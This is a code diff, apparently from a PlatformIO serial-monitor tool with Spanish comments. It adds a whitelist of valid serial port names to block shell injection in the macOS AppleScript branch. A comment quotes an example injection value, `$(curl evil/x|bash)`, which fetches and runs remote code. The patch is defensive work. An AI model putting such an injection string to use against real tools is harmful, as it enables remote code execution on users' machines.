@@ -298,6 +298,35 @@ function quoteIfNeeded(value: string): string {
   return value === "" || /\s/.test(value) ? `"${value}"` : value
 }
 
+/**
+ * WHITELIST de formas REALES de puerto serie, una por plataforma — falla
+ * cerrada: si `puerto` no matchea NINGUNA, se rechaza. No hay un tercer caso
+ * que acepte "lo que sea".
+ *
+ * De donde sale cada forma (no se inventan, se leen del propio repo):
+ *   - Windows `COM<n>`: es el patron que ya usa `detectPort()` para leer la
+ *     salida cruda de `pio device list` cuando el JSON no parsea (mas abajo,
+ *     `/COM\d+/g`), y el ejemplo que da la propia descripcion del tool
+ *     ("ej: COM3").
+ *   - Unix `/dev/tty(USB|ACM)<n>`: el mismo fallback, rama Linux
+ *     (`/\/dev\/tty(?:USB|ACM)\d+/g`).
+ *   - Unix `/dev/cu.*` y `/dev/tty.*` con sufijo de nombre de chip: lo que
+ *     pyserial (la libreria que usa `pio device list`) devuelve en macOS —
+ *     `cu.usbserial-14140`, `cu.SLAB_USBtoUART`, `cu.Bluetooth-Incoming-Port` —
+ *     por eso el sufijo permite letras, digitos, punto, guion y guion bajo (el
+ *     alfabeto real de esos nombres) y nada mas: ni `$`, ni backtick, ni `;`,
+ *     ni espacio, ni comillas.
+ *
+ * USADA SOLO en la rama de macOS de `monitor` (mas abajo, adentro de
+ * `execute()`), que es la UNICA que arma un shell string — ver el comentario
+ * ahi de por que no hace falta en Windows ni en Linux.
+ */
+const PUERTO_WINDOWS = /^COM\d+$/i
+const PUERTO_UNIX = /^\/dev\/(?:tty|cu)[A-Za-z0-9._-]+$/
+export function puertoValido(puerto: string): boolean {
+  return PUERTO_WINDOWS.test(puerto) || PUERTO_UNIX.test(puerto)
+}
+
 // Lanza un proceso de forma "detached": no esperamos su salida ni bloqueamos la tool.
 // Se usa para abrir una ventana de terminal aparte (Linux/Mac) sin colgar `run()`.
 function launchDetached(cmd: string[], cwd: string): boolean {
@@ -1044,6 +1073,33 @@ Vas a ver los datos de la placa en ${puerto} a ${baud} baudios${origenBaud}. Par
 
         // Mac: le pedimos a Terminal.app que corra el comando en una ventana nueva via AppleScript.
         if (process.platform === "darwin") {
+          /*
+           * VALIDACION SOLO ACA, y es a proposito.
+           *
+           * `puerto` es un string libre (`args.port`, sin restricciones en el
+           * schema) que termina interpolado en un AppleScript que Terminal.app
+           * corre dentro de un shell POSIX. Ese shell expande `$(...)` AUNQUE
+           * este entre comillas dobles — el escape de mas abajo (`replace(/"/g,
+           * ...)`) es para el AppleScript, no alcanza para el shell de adentro.
+           * Un puerto como `$(curl evil/x|bash)` ejecuta lo que sea en la Mac
+           * del docente.
+           *
+           * Windows (mas abajo) y Linux (mas abajo todavia) arman el comando
+           * con ARRAYS reales para `Bun.spawn`, sin shell intermedio: no hay
+           * injection que tapar ahi, y agregarles la misma whitelist solo
+           * arriesga rechazar un puerto real con una forma que no imaginamos,
+           * en las dos plataformas que hoy andan bien. Por eso el chequeo vive
+           * solo en la rama que lo necesita.
+           */
+          if (!puertoValido(puerto)) {
+            return (
+              `No reconozco ese puerto: \`${puerto}\`.\n\n` +
+              "En Mac un puerto real tiene una forma como `/dev/cu.usbserial-14140` o " +
+              "`/dev/tty.usbserial-14140`. No lo voy a usar tal cual porque podria no ser " +
+              "un puerto — pedime `/diagnostico` para ver los puertos disponibles, o " +
+              "decime el puerto correcto."
+            )
+          }
           const shellCmd = `${quoteIfNeeded(pioPath)} device monitor --port ${quoteIfNeeded(puerto)} --baud ${baud}`
           const escapado = shellCmd.replace(/\\/g, "\\\\").replace(/"/g, '\\"')
           const script = `tell application "Terminal" to do script "${escapado}"`
